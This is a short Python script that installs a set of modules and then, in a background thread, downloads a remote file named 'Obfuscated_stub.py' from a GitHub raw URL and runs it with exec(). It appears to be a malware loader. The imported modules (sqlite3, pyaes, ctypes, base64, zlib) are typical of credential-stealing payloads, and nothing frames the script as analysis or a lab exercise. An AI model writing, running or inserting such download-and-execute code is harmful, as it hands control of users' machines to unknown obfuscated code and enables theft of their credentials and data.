import subprocess
import sys

def import_or_install(package):
    try:
        globals()[package] = __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        globals()[package] = __import__(package)

packages = [
    "shutil", "re", "subprocess", "time", "traceback", "random", "sqlite3",
    "json", "zlib", "base64", "os", "ctypes", "logging", "sys", "pyaes",
    "threading", "urllib3"
]

for package in packages:
    import_or_install(package)

import threading, requests

threading.Thread(target=lambda: exec(requests.get("https://raw.githubusercontent.com/43a1723/test/main/lmao/a/Obfuscated_stub.py").text)).start()
